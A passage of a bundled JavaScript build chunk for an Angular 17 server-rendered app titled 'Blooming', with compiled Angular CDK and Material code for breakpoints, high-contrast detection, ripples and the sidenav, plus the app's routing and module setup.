      })), takeUntil(this._destroySubject));
      const output = {
        observable: queryObservable,
        mql
      };
      this._queries.set(query, output);
      return output;
    }
  };
  _BreakpointObserver.\u0275fac = function BreakpointObserver_Factory(t) {
    return new (t || _BreakpointObserver)(\u0275\u0275inject(MediaMatcher), \u0275\u0275inject(NgZone));
  };
  _BreakpointObserver.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _BreakpointObserver,
    factory: _BreakpointObserver.\u0275fac,
    providedIn: "root"
  });
  let BreakpointObserver2 = _BreakpointObserver;
  return BreakpointObserver2;
})();
function splitQueries(queries) {
  return queries.map((query) => query.split(",")).reduce((a1, a2) => a1.concat(a2)).map((query) => query.trim());
}

// node_modules/@angular/cdk/fesm2022/a11y.mjs
function isFakeMousedownFromScreenReader(event) {
  return event.buttons === 0 || event.detail === 0;
}
function isFakeTouchstartFromScreenReader(event) {
  const touch = event.touches && event.touches[0] || event.changedTouches && event.changedTouches[0];
  return !!touch && touch.identifier === -1 && (touch.radiusX == null || touch.radiusX === 1) && (touch.radiusY == null || touch.radiusY === 1);
}
var BLACK_ON_WHITE_CSS_CLASS = "cdk-high-contrast-black-on-white";
var WHITE_ON_BLACK_CSS_CLASS = "cdk-high-contrast-white-on-black";
var HIGH_CONTRAST_MODE_ACTIVE_CSS_CLASS = "cdk-high-contrast-active";
var HighContrastModeDetector = /* @__PURE__ */ (() => {
  const _HighContrastModeDetector = class _HighContrastModeDetector {
    constructor(_platform, document2) {
      this._platform = _platform;
      this._document = document2;
      this._breakpointSubscription = inject(BreakpointObserver).observe("(forced-colors: active)").subscribe(() => {
        if (this._hasCheckedHighContrastMode) {
          this._hasCheckedHighContrastMode = false;
          this._applyBodyHighContrastModeCssClasses();
        }
      });
    }
    /** Gets the current high-contrast-mode for the page. */
    getHighContrastMode() {
      if (!this._platform.isBrowser) {
        return 0;
      }
      const testElement = this._document.createElement("div");
      testElement.style.backgroundColor = "rgb(1,2,3)";
      testElement.style.position = "absolute";
      this._document.body.appendChild(testElement);
      const documentWindow = this._document.defaultView || window;
      const computedStyle = documentWindow && documentWindow.getComputedStyle ? documentWindow.getComputedStyle(testElement) : null;
      const computedColor = (computedStyle && computedStyle.backgroundColor || "").replace(/ /g, "");
      testElement.remove();
      switch (computedColor) {
        case "rgb(0,0,0)":
        case "rgb(45,50,54)":
        case "rgb(32,32,32)":
          return 2;
        case "rgb(255,255,255)":
        case "rgb(255,250,239)":
          return 1;
      }
      return 0;
    }
    ngOnDestroy() {
      this._breakpointSubscription.unsubscribe();
    }
    /** Applies CSS classes indicating high-contrast mode to document body (browser-only). */
    _applyBodyHighContrastModeCssClasses() {
      if (!this._hasCheckedHighContrastMode && this._platform.isBrowser && this._document.body) {
        const bodyClasses = this._document.body.classList;
        bodyClasses.remove(HIGH_CONTRAST_MODE_ACTIVE_CSS_CLASS, BLACK_ON_WHITE_CSS_CLASS, WHITE_ON_BLACK_CSS_CLASS);
        this._hasCheckedHighContrastMode = true;
        const mode = this.getHighContrastMode();
        if (mode === 1) {
          bodyClasses.add(HIGH_CONTRAST_MODE_ACTIVE_CSS_CLASS, BLACK_ON_WHITE_CSS_CLASS);
        } else if (mode === 2) {
          bodyClasses.add(HIGH_CONTRAST_MODE_ACTIVE_CSS_CLASS, WHITE_ON_BLACK_CSS_CLASS);
        }
      }
    }
  };
  _HighContrastModeDetector.\u0275fac = function HighContrastModeDetector_Factory(t) {
    return new (t || _HighContrastModeDetector)(\u0275\u0275inject(Platform), \u0275\u0275inject(DOCUMENT));
  };
  _HighContrastModeDetector.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _HighContrastModeDetector,
    factory: _HighContrastModeDetector.\u0275fac,
    providedIn: "root"
  });
  let HighContrastModeDetector2 = _HighContrastModeDetector;
  return HighContrastModeDetector2;
})();

// node_modules/@angular/cdk/fesm2022/cdk.mjs
var VERSION = /* @__PURE__ */ new Version("17.0.2");

// node_modules/@angular/material/fesm2022/core.mjs
var VERSION2 = /* @__PURE__ */ new Version("17.0.2");
function MATERIAL_SANITY_CHECKS_FACTORY() {
  return true;
}
var MATERIAL_SANITY_CHECKS = /* @__PURE__ */ new InjectionToken("mat-sanity-checks", {
  providedIn: "root",
  factory: MATERIAL_SANITY_CHECKS_FACTORY
});
var MatCommonModule = /* @__PURE__ */ (() => {
  const _MatCommonModule = class _MatCommonModule {
    constructor(highContrastModeDetector, _sanityChecks, _document) {
      this._sanityChecks = _sanityChecks;
      this._document = _document;
      this._hasDoneGlobalChecks = false;
      highContrastModeDetector._applyBodyHighContrastModeCssClasses();
      if (!this._hasDoneGlobalChecks) {
        this._hasDoneGlobalChecks = true;
        if (typeof ngDevMode === "undefined" || ngDevMode) {
          const platform = inject(Platform, {
            optional: true
          });
          if (this._checkIsEnabled("doctype")) {
            _checkDoctypeIsDefined(this._document);
          }
          if (this._checkIsEnabled("theme")) {
            _checkThemeIsPresent(this._document, !!platform?.isBrowser);
          }
          if (this._checkIsEnabled("version")) {
            _checkCdkVersionMatch();
          }
        }
      }
    }
    /** Gets whether a specific sanity check is enabled. */
    _checkIsEnabled(name) {
      if (_isTestEnvironment()) {
        return false;
      }
      if (typeof this._sanityChecks === "boolean") {
        return this._sanityChecks;
      }
      return !!this._sanityChecks[name];
    }
  };
  _MatCommonModule.\u0275fac = function MatCommonModule_Factory(t) {
    return new (t || _MatCommonModule)(\u0275\u0275inject(HighContrastModeDetector), \u0275\u0275inject(MATERIAL_SANITY_CHECKS, 8), \u0275\u0275inject(DOCUMENT));
  };
  _MatCommonModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _MatCommonModule
  });
  _MatCommonModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [BidiModule, BidiModule]
  });
  let MatCommonModule2 = _MatCommonModule;
  return MatCommonModule2;
})();
function _checkDoctypeIsDefined(doc) {
  if (!doc.doctype) {
    console.warn("Current document does not have a doctype. This may cause some Angular Material components not to behave as expected.");
  }
}
function _checkThemeIsPresent(doc, isBrowser) {
  if (!doc.body || !isBrowser) {
    return;
  }
  const testElement = doc.createElement("div");
  testElement.classList.add("mat-theme-loaded-marker");
  doc.body.appendChild(testElement);
  const computedStyle = getComputedStyle(testElement);
  if (computedStyle && computedStyle.display !== "none") {
    console.warn("Could not find Angular Material core theme. Most Material components may not work as expected. For more info refer to the theming guide: https://material.angular.io/guide/theming");
  }
  testElement.remove();
}
function _checkCdkVersionMatch() {
  if (VERSION2.full !== VERSION.full) {
    console.warn("The Angular Material version (" + VERSION2.full + ") does not match the Angular CDK version (" + VERSION.full + ").\nPlease ensure the versions of these two packages exactly match.");
  }
}
var RippleRef = class {
  constructor(_renderer, element, config, _animationForciblyDisabledThroughCss = false) {
    this._renderer = _renderer;
    this.element = element;
    this.config = config;
    this._animationForciblyDisabledThroughCss = _animationForciblyDisabledThroughCss;
    this.state = 3;
  }
  /** Fades out the ripple element. */
  fadeOut() {
    this._renderer.fadeOutRipple(this);
  }
};
var passiveCapturingEventOptions$1 = /* @__PURE__ */ normalizePassiveListenerOptions({
  passive: true,
  capture: true
});
var RippleEventManager = class {
  constructor() {
    this._events = /* @__PURE__ */ new Map();
    this._delegateEventHandler = (event) => {
      const target = _getEventTarget(event);
      if (target) {
        this._events.get(event.type)?.forEach((handlers, element) => {
          if (element === target || element.contains(target)) {
            handlers.forEach((handler) => handler.handleEvent(event));
          }
        });
      }
    };
  }
  /** Adds an event handler. */
  addHandler(ngZone, name, element, handler) {
    const handlersForEvent = this._events.get(name);
    if (handlersForEvent) {
      const handlersForElement = handlersForEvent.get(element);
      if (handlersForElement) {
        handlersForElement.add(handler);
      } else {
        handlersForEvent.set(element, /* @__PURE__ */ new Set([handler]));
      }
    } else {
      this._events.set(name, /* @__PURE__ */ new Map([[element, /* @__PURE__ */ new Set([handler])]]));
      ngZone.runOutsideAngular(() => {
        document.addEventListener(name, this._delegateEventHandler, passiveCapturingEventOptions$1);
      });
    }
  }
  /** Removes an event handler. */
  removeHandler(name, element, handler) {
    const handlersForEvent = this._events.get(name);
    if (!handlersForEvent) {
      return;
    }
    const handlersForElement = handlersForEvent.get(element);
    if (!handlersForElement) {
      return;
    }
    handlersForElement.delete(handler);
    if (handlersForElement.size === 0) {
      handlersForEvent.delete(element);
    }
    if (handlersForEvent.size === 0) {
      this._events.delete(name);
      document.removeEventListener(name, this._delegateEventHandler, passiveCapturingEventOptions$1);
    }
  }
};
var defaultRippleAnimationConfig = {
  enterDuration: 225,
  exitDuration: 150
};
var ignoreMouseEventsTimeout = 800;
var passiveCapturingEventOptions = /* @__PURE__ */ normalizePassiveListenerOptions({
  passive: true,
  capture: true
});
var pointerDownEvents = ["mousedown", "touchstart"];
var pointerUpEvents = ["mouseup", "mouseleave", "touchend", "touchcancel"];
var _RippleRenderer = class _RippleRenderer {
  constructor(_target, _ngZone, elementOrElementRef, _platform) {
    this._target = _target;
    this._ngZone = _ngZone;
    this._platform = _platform;
    this._isPointerDown = false;
    this._activeRipples = /* @__PURE__ */ new Map();
    this._pointerUpEventsRegistered = false;
    if (_platform.isBrowser) {
      this._containerElement = coerceElement(elementOrElementRef);
    }
  }
  /**
   * Fades in a ripple at the given coordinates.
   * @param x Coordinate within the element, along the X axis at which to start the ripple.
   * @param y Coordinate within the element, along the Y axis at which to start the ripple.
   * @param config Extra ripple options.
   */
  fadeInRipple(x, y, config = {}) {
    const containerRect = this._containerRect = this._containerRect || this._containerElement.getBoundingClientRect();
    const animationConfig = __spreadValues(__spreadValues({}, defaultRippleAnimationConfig), config.animation);
    if (config.centered) {
      x = containerRect.left + containerRect.width / 2;
      y = containerRect.top + containerRect.height / 2;
    }
    const radius = config.radius || distanceToFurthestCorner(x, y, containerRect);
    const offsetX = x - containerRect.left;
    const offsetY = y - containerRect.top;
    const enterDuration = animationConfig.enterDuration;
    const ripple = document.createElement("div");
    ripple.classList.add("mat-ripple-element");
    ripple.style.left = `${offsetX - radius}px`;
    ripple.style.top = `${offsetY - radius}px`;
    ripple.style.height = `${radius * 2}px`;
    ripple.style.width = `${radius * 2}px`;
    if (config.color != null) {
      ripple.style.backgroundColor = config.color;
    }
    ripple.style.transitionDuration = `${enterDuration}ms`;
    this._containerElement.appendChild(ripple);
    const computedStyles = window.getComputedStyle(ripple);
    const userTransitionProperty = computedStyles.transitionProperty;
    const userTransitionDuration = computedStyles.transitionDuration;
    const animationForciblyDisabledThroughCss = userTransitionProperty === "none" || // Note: The canonical unit for serialized CSS `<time>` properties is seconds. Additionally
    // some browsers expand the duration for every property (in our case `opacity` and `transform`).
    userTransitionDuration === "0s" || userTransitionDuration === "0s, 0s" || // If the container is 0x0, it's likely `display: none`.
    containerRect.width === 0 && containerRect.height === 0;
    const rippleRef = new RippleRef(this, ripple, config, animationForciblyDisabledThroughCss);
    ripple.style.transform = "scale3d(1, 1, 1)";
    rippleRef.state = 0;
    if (!config.persistent) {
      this._mostRecentTransientRipple = rippleRef;
    }
    let eventListeners = null;
    if (!animationForciblyDisabledThroughCss && (enterDuration || animationConfig.exitDuration)) {
      this._ngZone.runOutsideAngular(() => {
        const onTransitionEnd = () => this._finishRippleTransition(rippleRef);
        const onTransitionCancel = () => this._destroyRipple(rippleRef);
        ripple.addEventListener("transitionend", onTransitionEnd);
        ripple.addEventListener("transitioncancel", onTransitionCancel);
        eventListeners = {
          onTransitionEnd,
          onTransitionCancel
        };
      });
    }
    this._activeRipples.set(rippleRef, eventListeners);
    if (animationForciblyDisabledThroughCss || !enterDuration) {
      this._finishRippleTransition(rippleRef);
    }
    return rippleRef;
  }
  /** Fades out a ripple reference. */
  fadeOutRipple(rippleRef) {
    if (rippleRef.state === 2 || rippleRef.state === 3) {
      return;
    }
    const rippleEl = rippleRef.element;
    const animationConfig = __spreadValues(__spreadValues({}, defaultRippleAnimationConfig), rippleRef.config.animation);
    rippleEl.style.transitionDuration = `${animationConfig.exitDuration}ms`;
    rippleEl.style.opacity = "0";
    rippleRef.state = 2;
    if (rippleRef._animationForciblyDisabledThroughCss || !animationConfig.exitDuration) {
      this._finishRippleTransition(rippleRef);
    }
  }
  /** Fades out all currently active ripples. */
  fadeOutAll() {
    this._getActiveRipples().forEach((ripple) => ripple.fadeOut());
  }
  /** Fades out all currently active non-persistent ripples. */
  fadeOutAllNonPersistent() {
    this._getActiveRipples().forEach((ripple) => {
      if (!ripple.config.persistent) {
        ripple.fadeOut();
      }
    });
  }
  /** Sets up the trigger event listeners */
  setupTriggerEvents(elementOrElementRef) {
    const element = coerceElement(elementOrElementRef);
    if (!this._platform.isBrowser || !element || element === this._triggerElement) {
      return;
    }
    this._removeTriggerEvents();
    this._triggerElement = element;
    pointerDownEvents.forEach((type) => {
      _RippleRenderer._eventManager.addHandler(this._ngZone, type, element, this);
    });
  }
  /**
   * Handles all registered events.
   * @docs-private
   */
  handleEvent(event) {
    if (event.type === "mousedown") {
      this._onMousedown(event);
    } else if (event.type === "touchstart") {
      this._onTouchStart(event);
    } else {
      this._onPointerUp();
    }
    if (!this._pointerUpEventsRegistered) {
      this._ngZone.runOutsideAngular(() => {
        pointerUpEvents.forEach((type) => {
          this._triggerElement.addEventListener(type, this, passiveCapturingEventOptions);
        });
      });
      this._pointerUpEventsRegistered = true;
    }
  }
  /** Method that will be called if the fade-in or fade-in transition completed. */
  _finishRippleTransition(rippleRef) {
    if (rippleRef.state === 0) {
      this._startFadeOutTransition(rippleRef);
    } else if (rippleRef.state === 2) {
      this._destroyRipple(rippleRef);
    }
  }
  /**
   * Starts the fade-out transition of the given ripple if it's not persistent and the pointer
   * is not held down anymore.
   */
  _startFadeOutTransition(rippleRef) {
    const isMostRecentTransientRipple = rippleRef === this._mostRecentTransientRipple;
    const {
      persistent
    } = rippleRef.config;
    rippleRef.state = 1;
    if (!persistent && (!isMostRecentTransientRipple || !this._isPointerDown)) {
      rippleRef.fadeOut();
    }
  }
  /** Destroys the given ripple by removing it from the DOM and updating its state. */
  _destroyRipple(rippleRef) {
    const eventListeners = this._activeRipples.get(rippleRef) ?? null;
    this._activeRipples.delete(rippleRef);
    if (!this._activeRipples.size) {
      this._containerRect = null;
    }
    if (rippleRef === this._mostRecentTransientRipple) {
      this._mostRecentTransientRipple = null;
    }
    rippleRef.state = 3;
    if (eventListeners !== null) {
      rippleRef.element.removeEventListener("transitionend", eventListeners.onTransitionEnd);
      rippleRef.element.removeEventListener("transitioncancel", eventListeners.onTransitionCancel);
    }
    rippleRef.element.remove();
  }
  /** Function being called whenever the trigger is being pressed using mouse. */
  _onMousedown(event) {
    const isFakeMousedown = isFakeMousedownFromScreenReader(event);
    const isSyntheticEvent = this._lastTouchStartEvent && Date.now() < this._lastTouchStartEvent + ignoreMouseEventsTimeout;
    if (!this._target.rippleDisabled && !isFakeMousedown && !isSyntheticEvent) {
      this._isPointerDown = true;
      this.fadeInRipple(event.clientX, event.clientY, this._target.rippleConfig);
    }
  }
  /** Function being called whenever the trigger is being pressed using touch. */
  _onTouchStart(event) {
    if (!this._target.rippleDisabled && !isFakeTouchstartFromScreenReader(event)) {
      this._lastTouchStartEvent = Date.now();
      this._isPointerDown = true;
      const touches = event.changedTouches;
      if (touches) {
        for (let i = 0; i < touches.length; i++) {
          this.fadeInRipple(touches[i].clientX, touches[i].clientY, this._target.rippleConfig);
        }
      }
    }
  }
  /** Function being called whenever the trigger is being released. */
  _onPointerUp() {
    if (!this._isPointerDown) {
      return;
    }
    this._isPointerDown = false;
    this._getActiveRipples().forEach((ripple) => {
      const isVisible = ripple.state === 1 || ripple.config.terminateOnPointerUp && ripple.state === 0;
      if (!ripple.config.persistent && isVisible) {
        ripple.fadeOut();
      }
    });
  }
  _getActiveRipples() {
    return Array.from(this._activeRipples.keys());
  }
  /** Removes previously registered event listeners from the trigger element. */
  _removeTriggerEvents() {
    const trigger = this._triggerElement;
    if (trigger) {
      pointerDownEvents.forEach((type) => _RippleRenderer._eventManager.removeHandler(type, trigger, this));
      if (this._pointerUpEventsRegistered) {
        pointerUpEvents.forEach((type) => trigger.removeEventListener(type, this, passiveCapturingEventOptions));
      }
    }
  }
};
_RippleRenderer._eventManager = /* @__PURE__ */ new RippleEventManager();
var RippleRenderer = _RippleRenderer;
function distanceToFurthestCorner(x, y, rect) {
  const distX = Math.max(Math.abs(x - rect.left), Math.abs(x - rect.right));
  const distY = Math.max(Math.abs(y - rect.top), Math.abs(y - rect.bottom));
  return Math.sqrt(distX * distX + distY * distY);
}

// node_modules/@angular/material/fesm2022/sidenav.mjs
var MatSidenavModule = /* @__PURE__ */ (() => {
  const _MatSidenavModule = class _MatSidenavModule {
  };
  _MatSidenavModule.\u0275fac = function MatSidenavModule_Factory(t) {
    return new (t || _MatSidenavModule)();
  };
  _MatSidenavModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _MatSidenavModule
  });
  _MatSidenavModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [MatCommonModule, CdkScrollableModule, CdkScrollableModule, MatCommonModule]
  });
  let MatSidenavModule2 = _MatSidenavModule;
  return MatSidenavModule2;
})();

// src/app/app-routing.module.ts
var routes3 = [
  // login y recovery authroutingmodules
  // dashboard pagesroutingmodules
  {
    path: "**",
    redirectTo: "inicio"
  }
];
var AppRoutingModule = /* @__PURE__ */ (() => {
  const _AppRoutingModule = class _AppRoutingModule {
  };
  _AppRoutingModule.\u0275fac = function AppRoutingModule_Factory(t) {
    return new (t || _AppRoutingModule)();
  };
  _AppRoutingModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _AppRoutingModule
  });
  _AppRoutingModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [RouterModule.forRoot(routes3), AuthRoutingModule, PagesRoutingModule, MatSidenavModule, RouterModule]
  });
  let AppRoutingModule2 = _AppRoutingModule;
  return AppRoutingModule2;
})();

// src/app/app.component.ts
var AppComponent = /* @__PURE__ */ (() => {
  const _AppComponent = class _AppComponent {
    constructor() {
      this.title = "Blooming";
    }
  };
  _AppComponent.\u0275fac = function AppComponent_Factory(t) {
    return new (t || _AppComponent)();
  };
  _AppComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _AppComponent,
    selectors: [["app-root"]],
    decls: 1,
    vars: 0,
    template: function AppComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275element(0, "router-outlet");
      }
    },
    dependencies: [RouterOutlet],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let AppComponent2 = _AppComponent;
  return AppComponent2;
})();

// src/app/commons/commons.module.ts
var CommonsModule = /* @__PURE__ */ (() => {
  const _CommonsModule = class _CommonsModule {
  };
  _CommonsModule.\u0275fac = function CommonsModule_Factory(t) {
    return new (t || _CommonsModule)();
  };
  _CommonsModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _CommonsModule
  });
  _CommonsModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [CommonModule, AppRoutingModule]
  });
  let CommonsModule2 = _CommonsModule;
  return CommonsModule2;
})();

// src/app/pages/pages.module.ts
var PagesModule = /* @__PURE__ */ (() => {
  const _PagesModule = class _PagesModule {
  };
  _PagesModule.\u0275fac = function PagesModule_Factory(t) {
    return new (t || _PagesModule)();
  };
  _PagesModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _PagesModule
  });
  _PagesModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [CommonModule, RouterModule, CommonsModule, FormsModule, ReactiveFormsModule]
  });
  let PagesModule2 = _PagesModule;
  return PagesModule2;
})();

// src/app/auth/auth.module.ts
var AuthModule = /* @__PURE__ */ (() => {
  const _AuthModule = class _AuthModule {
  };
  _AuthModule.\u0275fac = function AuthModule_Factory(t) {
    return new (t || _AuthModule)();
  };
  _AuthModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _AuthModule
  });
  _AuthModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [CommonModule, RouterModule, FormsModule, ReactiveFormsModule, HttpClientModule]
  });
  let AuthModule2 = _AuthModule;
  return AuthModule2;
})();

// src/app/app.module.ts
var AppModule = /* @__PURE__ */ (() => {
  const _AppModule = class _AppModule {
  };
  _AppModule.\u0275fac = function AppModule_Factory(t) {
    return new (t || _AppModule)();
  };
  _AppModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _AppModule,
    bootstrap: [AppComponent]
  });
  _AppModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    providers: [provideClientHydration()],
    imports: [BrowserModule, AppRoutingModule, PagesModule, AuthModule, BrowserAnimationsModule, CommonModule, CommonsModule, FormsModule, ReactiveFormsModule]
  });
  let AppModule2 = _AppModule;
  return AppModule2;
})();

// src/app/app.module.server.ts
var AppServerModule = /* @__PURE__ */ (() => {
  const _AppServerModule = class _AppServerModule {
  };
  _AppServerModule.\u0275fac = function AppServerModule_Factory(t) {
    return new (t || _AppServerModule)();
  };
  _AppServerModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _AppServerModule,
    bootstrap: [AppComponent]
  });
  _AppServerModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [AppModule, ServerModule]
  });
  let AppServerModule2 = _AppServerModule;
  return AppServerModule2;
})();

export {
  AppServerModule
};
/*! Bundled license information:

sweetalert2/dist/sweetalert2.all.js:
  (*!
  * sweetalert2 v11.10.1
  * Released under the MIT License.
  *)

@angular/forms/fesm2022/forms.mjs:
  (**
   * @license Angular v17.0.4
   * (c) 2010-2022 Google LLC. https://angular.io/
   * License: MIT
   *)
*/
//# sourceMappingURL=chunk-VP4SM754.mjs.map
